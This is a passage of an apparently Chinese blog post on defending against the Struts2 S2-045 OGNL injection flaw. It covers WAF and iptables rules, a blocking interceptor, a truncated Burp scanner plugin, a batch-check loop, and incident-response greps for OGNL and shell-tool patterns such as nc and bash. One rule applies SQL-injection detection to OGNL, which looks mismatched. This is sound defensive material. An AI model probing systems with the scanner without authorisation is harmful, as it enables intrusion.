&lt;figure class=&#34;highlight 1c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs 1c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 检测S2-045攻击特征&lt;/span&gt;&lt;br&gt;SecRule REQUEST_HEADERS&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;Content&lt;span class=&#34;hljs-punctuation&#34;&gt;-&lt;/span&gt;Type &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;@detectSQLi&amp;quot;&lt;/span&gt; \&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;id:1001,\&lt;/span&gt;&lt;br&gt;    phase&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    block&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    msg&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Struts2 S2-045 Attack Detected&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    logdata&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Content-Type: %&amp;#123;MATCHED_VAR&amp;#125;&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    tag&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;attack-sqli&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    tag&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&amp;#x27;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 检测OGNL表达式&lt;/span&gt;&lt;br&gt;SecRule REQUEST_HEADERS&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;Content&lt;span class=&#34;hljs-punctuation&#34;&gt;-&lt;/span&gt;Type &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;@contains %&amp;#123;&amp;quot;&lt;/span&gt; \&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;id:1002,\&lt;/span&gt;&lt;br&gt;    phase&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    block&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    msg&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Potential OGNL Injection in Content-Type&amp;#x27;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;3-网络层防护&#34;&gt;&lt;a href=&#34;#3-网络层防护&#34; class=&#34;headerlink&#34; title=&#34;3. 网络层防护&#34;&gt;&lt;/a&gt;3. 网络层防护&lt;/h4&gt;&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;# iptables规则示例&lt;br&gt;iptables -&lt;span class=&#34;hljs-selector-tag&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;INPUT&lt;/span&gt; -&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; tcp &lt;span class=&#34;hljs-attr&#34;&gt;--dport&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt; -m string &lt;span class=&#34;hljs-attr&#34;&gt;--string&lt;/span&gt; &amp;quot;%&amp;#123;&amp;quot; &lt;span class=&#34;hljs-attr&#34;&gt;--algo&lt;/span&gt; bm -j DROP&lt;br&gt;iptables -&lt;span class=&#34;hljs-selector-tag&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;INPUT&lt;/span&gt; -&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; tcp &lt;span class=&#34;hljs-attr&#34;&gt;--dport&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt; -m string &lt;span class=&#34;hljs-attr&#34;&gt;--string&lt;/span&gt; &amp;quot;ognl&amp;quot; &lt;span class=&#34;hljs-attr&#34;&gt;--algo&lt;/span&gt; bm -j DROP&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;4-应用层加固&#34;&gt;&lt;a href=&#34;#4-应用层加固&#34; class=&#34;headerlink&#34; title=&#34;4. 应用层加固&#34;&gt;&lt;/a&gt;4. 应用层加固&lt;/h4&gt;&lt;figure class=&#34;highlight scala&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs scala&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 自定义拦截器&lt;/span&gt;&lt;br&gt;public &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;SecurityInterceptor&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;AbstractInterceptor&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;    public &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; intercept(&lt;span class=&#34;hljs-type&#34;&gt;ActionInvocation&lt;/span&gt; invocation) &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;Exception&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;HttpServletRequest&lt;/span&gt; request = &lt;span class=&#34;hljs-type&#34;&gt;ServletActionContext&lt;/span&gt;.getRequest();&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; contentType = request.getContentType();&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (contentType != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; contentType.contains(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%&amp;#123;&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;SecurityException&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Malicious Content-Type detected&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; invocation.invoke();&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;实战技巧与工具&#34;&gt;&lt;a href=&#34;#实战技巧与工具&#34; class=&#34;headerlink&#34; title=&#34;实战技巧与工具&#34;&gt;&lt;/a&gt;实战技巧与工具&lt;/h2&gt;&lt;h3 id=&#34;BurpSuite插件开发&#34;&gt;&lt;a href=&#34;#BurpSuite插件开发&#34; class=&#34;headerlink&#34; title=&#34;BurpSuite插件开发&#34;&gt;&lt;/a&gt;BurpSuite插件开发&lt;/h3&gt;&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// S2-045检测插件框架&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;S2045Scanner&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;IScannerCheck&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; List&amp;lt;IScanIssue&amp;gt; &lt;span class=&#34;hljs-title function_&#34;&gt;doActiveScan&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 构造S2-045 payload&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%&amp;#123;(#nike=&amp;#x27;multipart/form-data&amp;#x27;)...&amp;#125;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 发送测试请求&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;byte&lt;/span&gt;[] checkRequest = insertionPoint.buildRequest(payload.getBytes());&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;IHttpRequestResponse&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;checkRequestResponse&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 分析响应判断是否存在漏洞&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (isVulnerable(checkRequestResponse)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; Collections.singletonList(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;CustomScanIssue&lt;/span&gt;(&lt;span class=&#34;hljs-comment&#34;&gt;/* ... */&lt;/span&gt;));&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;批量检测脚本&#34;&gt;&lt;a href=&#34;#批量检测脚本&#34; class=&#34;headerlink&#34; title=&#34;批量检测脚本&#34;&gt;&lt;/a&gt;批量检测脚本&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# S2-045批量检测脚本&lt;/span&gt;&lt;br&gt;&lt;br&gt;targets=(&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target1.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target2.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target3.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;)&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; target &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;targets[@]&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Testing: &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;    python3 s2-045-check.py &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;---&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;done&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;应急响应指南&#34;&gt;&lt;a href=&#34;#应急响应指南&#34; class=&#34;headerlink&#34; title=&#34;应急响应指南&#34;&gt;&lt;/a&gt;应急响应指南&lt;/h2&gt;&lt;h3 id=&#34;1-漏洞确认&#34;&gt;&lt;a href=&#34;#1-漏洞确认&#34; class=&#34;headerlink&#34; title=&#34;1. 漏洞确认&#34;&gt;&lt;/a&gt;1. 漏洞确认&lt;/h3&gt;&lt;figure class=&#34;highlight gradle&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gradle&#34;&gt;# 检查Struts2版本&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/ -name &amp;quot;struts2-core-*.jar&amp;quot; 2&amp;gt;/&lt;/span&gt;dev/&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;&lt;br&gt;&lt;br&gt;# 检查访问日志中的攻击特征&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Content-Type.*%\&amp;#123;&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/apache2/&lt;/span&gt;access.log&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ognl|ProcessBuilder|Runtime&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/tomcat/&lt;/span&gt;catalina.out&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;2-应急处置&#34;&gt;&lt;a href=&#34;#2-应急处置&#34; class=&#34;headerlink&#34; title=&#34;2. 应急处置&#34;&gt;&lt;/a&gt;2. 应急处置&lt;/h3&gt;&lt;figure class=&#34;highlight sas&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sas&#34;&gt;# 临时阻断攻击IP&lt;br&gt;iptables -A &lt;span class=&#34;hljs-keyword&#34;&gt;INPUT&lt;/span&gt; -s &amp;lt;攻击IP&amp;gt; -j &lt;span class=&#34;hljs-keyword&#34;&gt;DROP&lt;/span&gt;&lt;br&gt;&lt;br&gt;# 停止相关服务&lt;br&gt;systemctl &lt;span class=&#34;hljs-keyword&#34;&gt;stop&lt;/span&gt; tomcat&lt;br&gt;systemctl &lt;span class=&#34;hljs-keyword&#34;&gt;stop&lt;/span&gt; apache2&lt;br&gt;&lt;br&gt;# 备份系统状态&lt;br&gt;tar -czf /tmp/system_backup_$(date +&lt;span class=&#34;hljs-title function_&#34;&gt;%Y&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%m&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%d_&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%H&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%M&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%S&lt;/span&gt;).tar.gz /var/log /etc /opt/tomcat&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-痕迹清理检查&#34;&gt;&lt;a href=&#34;#3-痕迹清理检查&#34; class=&#34;headerlink&#34; title=&#34;3. 痕迹清理检查&#34;&gt;&lt;/a&gt;3. 痕迹清理检查&lt;/h3&gt;&lt;figure class=&#34;highlight vim&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs vim&#34;&gt;# 检查是否有异常进程&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;ps&lt;/span&gt; aux | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;nc|bash|sh|python|perl&amp;quot;&lt;/span&gt; | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -v &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt;&lt;br&gt;&lt;br&gt;# 检查网络连接&lt;br&gt;netstat -antlp | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; ESTABLISHED&lt;br&gt;&lt;br&gt;# 检查新增文件&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; /tmp /var/tmp -&lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;f&lt;/span&gt; -mtime -&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; /&lt;span class=&#34;hljs-keyword&#34;&gt;opt&lt;/span&gt;/tomcat/webapps -name &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;*.jsp&amp;quot;&lt;/span&gt; -mtime -&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;总结&#34;&gt;&lt;a href=&#34;#总结&#34; class=&#34;headerlink&#34; title=&#34;总结&#34;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;Struts2-045漏洞的特点：&lt;/p&gt;
&lt;h3 id=&#34;优势（从攻击者角度）&#34;&gt;&lt;a href=&#34;#优势（从攻击者角度）&#34; class=&#34;headerlink&#34; title=&#34;优势（从攻击者角度）&#34;&gt;&lt;/a&gt;优势（从攻击者角度）&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;利用简单&lt;/strong&gt;: 只需构造HTTP请求头即可&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;影响面广&lt;/strong&gt;: 大量企业级应用使用Struts2框架&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;检测困难&lt;/strong&gt;: 攻击流量可能被忽略&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;危害严重&lt;/strong&gt;: 直接获得服务器执行权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;防护要点&#34;&gt;&lt;a href=&#34;#防护要点&#34; class=&#34;headerlink&#34; title=&#34;防护要点&#34;&gt;&lt;/a&gt;防护要点&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;及时更新&lt;/strong&gt;: 升级到安全版本是根本解决方案&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;深度防御&lt;/strong&gt;: 结合WAF、IDS等多层防护&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;监控告警&lt;/strong&gt;: 建立有效的安全监控体系&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;应急响应&lt;/strong&gt;: 制定完善的安全事件响应流程&lt;/li&gt;
&lt;/ul&gt;
